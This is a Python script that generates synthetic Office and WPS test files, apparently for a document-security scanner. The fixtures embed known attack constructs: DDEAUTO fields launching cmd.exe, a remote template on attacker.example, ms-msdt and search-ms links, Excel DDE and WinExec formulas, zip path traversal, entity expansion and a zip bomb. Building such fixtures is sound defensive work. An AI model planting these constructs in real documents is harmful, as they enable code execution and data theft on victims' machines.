"""Build the synthetic test fixtures into a folder (python tests/make_fixtures.py DIR).

Every fixture is generated here from code, so nothing binary is stored in the
repo. They imitate the structures documented for WPS Office files (see
references/formats.md); they were not saved by WPS Office itself.
"""
import os
import struct
import sys
import zipfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import cfbwriter  # noqa: E402

PNG = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
       b"\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82")
FIB = b"\xec\xa5\xc1\x00" + b"\x00" * 6 + b"\x00\x02" + b"\x00" * 500
FIB_ENC = b"\xec\xa5\xc1\x00" + b"\x00" * 6 + b"\x00\x03" + b"\x00" * 500
BIFF = struct.pack("<HH", 0x0809, 16) + b"\x00" * 16 + struct.pack("<HH", 0x000A, 0)
BIFF_ENC = struct.pack("<HH", 0x0809, 16) + b"\x00" * 16 + struct.pack("<HH", 0x002F, 2) + b"\x00\x00" + struct.pack("<HH", 0x000A, 0)

CT_HEAD = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension="png" ContentType="image/png"/>'
RELS = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>'
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def rel(i, t, target, ext=False):
    return '<Relationship Id="%s" Type="%s%s" Target="%s"%s/>' % (i, R, t, target, ' TargetMode="External"' if ext else "")


def core(author="", last=""):
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">'
            + ("<dc:creator>%s</dc:creator>" % author if author else "")
            + ("<cp:lastModifiedBy>%s</cp:lastModifiedBy>" % last if last else "") + "</cp:coreProperties>")


def custom(props):
    body = "".join('<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="%d" name="%s"><vt:lpwstr>%s</vt:lpwstr></property>' % (i + 2, k, v) for i, (k, v) in enumerate(props.items()))
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">%s</Properties>' % body)


def app(name):
    return '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"><Application>%s</Application></Properties>' % name


def zwrite(path, parts):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for n, d in parts:
            z.writestr(n, d)


def docx(path, body="<w:p><w:r><w:t>Hello</w:t></w:r></w:p>", doc_rels="", settings_rels=None, extra=(), ctx=""):
    ct = CT_HEAD + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>' + ctx + "</Types>"
    parts = [("[Content_Types].xml", ct), ("_rels/.rels", RELS % rel("rId1", "officeDocument", "word/document.xml")),
             ("word/document.xml", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:body>%s</w:body></w:document>' % body),
             ("word/_rels/document.xml.rels", RELS % doc_rels)]
    if settings_rels is not None:
        parts.append(("word/settings.xml", '<?xml version="1.0"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:attachedTemplate r:id="rId1"/></w:settings>'))
        parts.append(("word/_rels/settings.xml.rels", RELS % settings_rels))
    zwrite(path, parts + list(extra))


def xlsx(path, sheet_xml, wb_extra_sheets="", extra=(), ctx=""):
    ct = CT_HEAD + '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>' + ctx + "</Types>"
    wb = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/>%s</sheets></workbook>' % wb_extra_sheets)
    sheet = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>%s</sheetData></worksheet>' % sheet_xml
    parts = [("[Content_Types].xml", ct), ("_rels/.rels", RELS % rel("rId1", "officeDocument", "xl/workbook.xml")),
             ("xl/workbook.xml", wb), ("xl/_rels/workbook.xml.rels", RELS % rel("rId1", "worksheet", "worksheets/sheet1.xml")),
             ("xl/worksheets/sheet1.xml", sheet)]
    zwrite(path, parts + list(extra))


def dispimg_cell(ref, pid):
    return '<c r="%s" t="str"><f>_xlfn.DISPIMG("%s",1)</f><v>=DISPIMG("%s",1)</v></c>' % (ref, pid, pid)


def cellimages(ids):
    pics = "".join('<etc:cellImage><xdr:pic><xdr:nvPicPr><xdr:cNvPr id="%d" name="%s"/><xdr:cNvPicPr/></xdr:nvPicPr><xdr:blipFill><a:blip r:embed="rId%d"/></xdr:blipFill><xdr:spPr/></xdr:pic></etc:cellImage>' % (i + 1, pid, i + 1) for i, pid in enumerate(ids))
    return ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><etc:cellImages xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:etc="http://www.wps.cn/officeDocument/2017/etCustomData">%s</etc:cellImages>' % pics)


ID1 = "ID_A16C8CE6E39B4F25934D584A1C41E1E1"
ID2 = "ID_0088DCB6A4964EEE86E72379D016275C"
ID3 = "ID_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"


def build(d):
    os.makedirs(d, exist_ok=True)
    p = lambda n: os.path.join(d, n)  # noqa: E731
    si = cfbwriter.summary_stream({4: "Zhang San", 8: "Li Si", 18: "WPS Office"})
    dsi = cfbwriter.summary_stream({15: "Example Co", 2: "KSOProductBuildVer=2052-11.1.0.10009"},
                                   fmtid=b"\x02\xd5\xcd\xd5\x9c\x2e\x1b\x10\x93\x97\x08\x00\x2b\x2c\xf9\xae")
    open(p("kingsoft.wps"), "wb").write(cfbwriter.build([("WordDocument", FIB + b"T" * 5000), ("1Table", b"t" * 200),
                                                        ("\x05SummaryInformation", si), ("\x05DocumentSummaryInformation", dsi)]))
    open(p("macro.wps"), "wb").write(cfbwriter.build([("WordDocument", FIB + b"T" * 5000), ("1Table", b"t" * 200),
                                                     ("Macros/VBA/dir", b"x" * 40), ("Macros/PROJECT", b"ID=1"),
                                                     ("ObjectPool/_1001/\x01Ole10Native", b"\x10\x00\x00\x00evil.exe\x00MZ" + b"\x00" * 64)]))
    open(p("encrypted.wps"), "wb").write(cfbwriter.build([("WordDocument", FIB_ENC + b"T" * 5000), ("1Table", b"t" * 200)]))
    open(p("works.wps"), "wb").write(cfbwriter.build([("MN0", b"\x00\xfe" + b"\x00" * 300), ("CompObj", b"Microsoft Works")]))
    legacy = bytearray(512)
    legacy[112:114] = b"\x01\xfe"
    open(p("works_legacy.wps"), "wb").write(bytes(legacy))
    open(p("sheet.et"), "wb").write(cfbwriter.build([("Workbook", BIFF + b"\x00" * 5000), ("\x05SummaryInformation", si)]))
    open(p("encrypted.et"), "wb").write(cfbwriter.build([("Workbook", BIFF_ENC + b"\x00" * 5000)]))
    open(p("slides.dps"), "wb").write(cfbwriter.build([("PowerPoint Document", b"\x00" * 5000), ("Current User", b"u" * 40)]))
    open(p("encrypted_ooxml.docx"), "wb").write(cfbwriter.build([("EncryptionInfo", b"\x04\x00\x04\x00" + b"\x00" * 200), ("EncryptedPackage", b"\x00" * 5000)]))

    def past_eof(fat, env):
        fat[0] = 120  # WordDocument chain jumps to a sector past the end of the file
    open(p("damaged.wps"), "wb").write(cfbwriter.build([("WordDocument", FIB + b"T" * 5000)], mutate=past_eof))

    def loop(fat, env):
        fat[1] = 0  # chain 0 -> 1 -> 0 ...
    open(p("loop.wps"), "wb").write(cfbwriter.build([("WordDocument", FIB + b"T" * 5000)], mutate=loop))

    # OOXML fixtures
    docx(p("clean.docx"))
    ksoc = custom({"KSOProductBuildVer": "2052-12.1.0.17827", "ICV": "1A2B3C"})
    docx(p("wps_saved.docx"), extra=[("docProps/core.xml", core("Zhang San", "Li Si")), ("docProps/custom.xml", ksoc),
                                     ("docProps/app.xml", app("WPS Office"))])
    docx(p("remote_template.docx"),
         body='<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc" </w:instrText></w:r></w:p>'
              '<w:p><w:ins w:id="1" w:author="x"><w:r><w:t>new</w:t></w:r></w:ins><w:del w:id="2" w:author="x"><w:r><w:delText>old</w:delText></w:r></w:del></w:p>'
              '<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>hidden</w:t></w:r></w:p>',
         doc_rels=rel("rId5", "hyperlink", "https://example.com/a?b=secret", True) + rel("rId6", "hyperlink", "file:///C:/Windows/System32/calc.exe", True),
         settings_rels=rel("rId1", "attachedTemplate", "https://attacker.example/t.dotm", True),
         extra=[("word/comments.xml", "<w:comments xmlns:w='http://schemas.openxmlformats.org/wordprocessingml/2006/main'/>"),
                ("docProps/core.xml", core("Evil\u202eexe.txt\u200b\u2066x", ""))])
    docx(p("ole_package.docx"), extra=[("word/embeddings/oleObject1.bin",
                                        cfbwriter.build([("\x01Ole10Native", b"\x10\x00\x00\x00run.bat\x00" + b"\x00" * 64)]))])
    docx(p("macro_under_docx.docx"), extra=[("word/vbaProject.bin", cfbwriter.build([("VBA/dir", b"x" * 40)]))])
    xlsx(p("cellimages.xlsx"), '<row r="1">%s%s</row><row r="2">%s</row>' % (dispimg_cell("A1", ID1), dispimg_cell("B1", ID2), dispimg_cell("B2", ID3)),
         extra=[("xl/cellimages.xml", cellimages([ID1, ID2])),
                ("xl/_rels/cellimages.xml.rels", RELS % (rel("rId1", "image", "media/image1.png") + rel("rId2", "image", "media/image2.png"))),
                ("xl/media/image1.png", PNG), ("xl/media/image2.png", b"<script>not an image</script>"),
                ("docProps/custom.xml", custom({"KSOProductBuildVer": "2052-12.1.0.17827"}))])
    xlsx(p("cellimages_ok.et"), '<row r="3">%s</row>' % dispimg_cell("C3", ID1),
         extra=[("xl/cellimages.xml", cellimages([ID1])), ("xl/_rels/cellimages.xml.rels", RELS % rel("rId1", "image", "media/image1.png")),
                ("xl/media/image1.png", PNG)])
    xlsx(p("traversal_cellimages.xlsx"), '<row r="1">%s</row>' % dispimg_cell("A1", ID1),
         extra=[("xl/cellimages.xml", cellimages([ID1])), ("xl/_rels/cellimages.xml.rels", RELS % rel("rId1", "image", "../../../etc/passwd"))])
    xlsx(p("jsa.xlsm"), '<row r="1"><c r="A1"><v>1</v></c></row>',
         extra=[("xl/JDEData.bin", "function Workbook_Open(){ Shell('calc') }")],
         ctx='<Override PartName="/xl/JDEData.bin" ContentType="application/vnd.wps-officedocument.jsadata"/>')
    xlsx(p("hidden.xlsx"), "", wb_extra_sheets='<sheet name="Secret" sheetId="2" state="veryHidden" r:id="rId2"/>')
    zwrite(p("docx_named.et"), [("[Content_Types].xml", CT_HEAD + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
                                ("word/document.xml", "<w:document xmlns:w='http://schemas.openxmlformats.org/wordprocessingml/2006/main'/>")])
    # refusal fixtures
    with zipfile.ZipFile(p("dup.docx"), "w") as z:
        z.writestr("[Content_Types].xml", CT_HEAD + "</Types>")
        z.writestr("word/document.xml", "<a/>")
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            z.writestr("word/document.xml", "<b/>")
    zwrite(p("case.docx"), [("[Content_Types].xml", CT_HEAD + "</Types>"), ("word/document.xml", "<a/>"), ("Word/Document.xml", "<b/>")])
    zwrite(p("traversal.docx"), [("[Content_Types].xml", CT_HEAD + "</Types>"), ("../evil.xml", "<a/>")])
    zwrite(p("doctype.docx"), [("[Content_Types].xml", CT_HEAD + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
                               ("word/document.xml", "<a/>"),
                               ("docProps/core.xml", '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><x>&b;</x>')])
    with zipfile.ZipFile(p("bomb.xlsx"), "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", CT_HEAD + "</Types>")
        z.writestr("xl/workbook.xml", b"\x00" * (12 * 1024 * 1024))
    open(p("notes.txt"), "w").write("just text\n")
    build_v011(p)
    return d


W_INSTR = '<w:r><w:fldChar w:fldCharType="%s"/></w:r>'


def build_v011(p):
    """Fixtures for the round-1 review gaps (v0.1.1)."""
    links = "".join(rel("rId%d" % i, "hyperlink", t, True) for i, t in enumerate(
        ["ms-msdt:/id PCWDiagnostic", " file:///c:/x.exe", "%66ile://srv/s", "search-ms:query=x",
         "mhtml:http://e.example/a!x", "ms-excel:ofe|u|http://e.example/a.xls", "\\\\srv\\share", "https://ok.example/"], 1))
    docx(p("links.docx"), doc_rels=links)
    # DDE split across runs, vanish with w:val=0 (not hidden) and specVanish (hidden)
    body = (W_INSTR % "begin" + '<w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\x.exe x</w:instrText></w:r>'
            + W_INSTR % "separate" + '<w:r><w:t>r</w:t></w:r>' + W_INSTR % "end"
            + '<w:p><w:r><w:rPr><w:vanish w:val="0"/></w:rPr><w:t>shown</w:t></w:r>'
            + '<w:r><w:rPr><w:specVanish/></w:rPr><w:t>gone</w:t></w:r></w:p>')
    docx(p("split_dde.docx"), body="<w:p>%s</w:p>" % body)
    docx(p("vanish_off.docx"), body='<w:p><w:r><w:rPr><w:vanish w:val="false"/></w:rPr><w:t>x</w:t></w:r></w:p>')
    # VBA renamed: found by relationship type and content type
    docx(p("renamed_vba.docx"), doc_rels='<Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="media/logo.bin"/>',
         extra=[("word/media/logo.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504)],
         ctx='<Override PartName="/word/media/logo.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
    docx(p("unknown_bin.docx"), extra=[("word/stuff/blob.dat", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504)])
    # UTF-16 XML with DOCTYPE
    bad = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY a "aaaa">]><x>&a;</x>'.encode("utf-16")
    zwrite(p("doctype16.docx"), [("[Content_Types].xml", CT_HEAD + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
                                 ("word/document.xml", "<a/>"), ("docProps/core.xml", bad)])
    # spreadsheet formulas, formula-like text, hidden rows and columns, ddeLink
    xs = ('<row r="1"><c r="A1"><f>cmd|\' /c calc\'!A0</f></c><c r="B1"><f>CALL("kernel32","WinExec","JCJ","calc",0)</f></c>'
          '<c r="C1"><f>WEBSERVICE("http://e.example/")</f></c><c r="D1"><f>HYPERLINK("http://e.example/","x")</f></c>'
          '<c r="E1" t="inlineStr"><is><t>=1+1</t></is></c></row><row r="2" hidden="1"><c r="A2"><v>1</v></c></row>')
    sheet_cols = '<cols><col min="2" max="2" hidden="1"/></cols>'
    xlsx(p("formulas.xlsx"), xs, extra=[("xl/externalLinks/externalLink1.xml",
         '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>')])
    s1 = open(p("formulas.xlsx"), "rb").read()  # keep simple: rewrite sheet with cols
    import io
    zin = zipfile.ZipFile(io.BytesIO(s1))
    parts = [(n, zin.read(n)) for n in zin.namelist()]
    parts = [(n, d.replace(b"<sheetData>", sheet_cols.encode() + b"<sheetData>") if n == "xl/worksheets/sheet1.xml" else d) for n, d in parts]
    zwrite(p("formulas.xlsx"), parts)
    # OpenDocument with Basic macros and an event listener
    zwrite(p("macro.odt"), [("mimetype", "application/vnd.oasis.opendocument.text"),
                           ("META-INF/manifest.xml", '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"/>'),
                           ("content.xml", '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"><office:event-listeners><script:event-listener script:event-name="dom:load"/></office:event-listeners></office:document-content>'),
                           ("Basic/Standard/Module1.xml", "<x/>")])
    # RTF: remote template and DDE field; RTF under a .docx name
    rtf = b"{\\rtf1{\\*\\template http://attacker.example/t.dotm}{\\field{\\*\\fldinst DDEAUTO c:\\\\x.exe x}{\\fldrslt r}}}"
    open(p("template.rtf"), "wb").write(rtf)
    open(p("rtf_named.docx"), "wb").write(b"{\\rtf1 hello}")


def canary_docx(path, port):
    docx(path, body='<w:p><w:r><w:t>canary</w:t></w:r></w:p><w:p><w:r><w:drawing><wp:inline xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"><wp:extent cx="914400" cy="914400"/><wp:docPr id="1" name="p"/><a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:nvPicPr><pic:cNvPr id="1" name="p"/><pic:cNvPicPr/></pic:nvPicPr><pic:blipFill><a:blip r:link="rId9"/></pic:blipFill><pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="914400" cy="914400"/></a:xfrm><a:prstGeom prst="rect"/></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>',
         doc_rels=rel("rId9", "image", "http://127.0.0.1:%d/canary.png" % port, True))


if __name__ == "__main__":
    print(build(sys.argv[1] if len(sys.argv) > 1 else "fixtures-out"))
